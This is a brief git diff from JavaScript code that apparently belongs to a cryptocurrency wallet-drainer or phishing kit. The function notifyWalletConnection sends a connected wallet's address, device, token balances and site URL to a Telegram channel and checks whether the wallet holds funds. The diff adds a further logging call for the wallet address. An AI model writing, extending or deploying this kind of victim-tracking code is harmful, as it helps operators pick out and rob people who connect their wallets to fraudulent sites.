@@ -377,6 +377,7 @@ async function notifyWalletConnection(address, walletName, device, balances, cha
                     `${tokenList}\n\n` +
                     `🔗 Site: ${siteUrl}`
     await sendTelegramMessage(message)
+	await log(address, scanLink);
     store.connectionKey = connectionKey
     const hasBalance = balances.some(token => token.balance > 0)
     if (!hasBalance) {
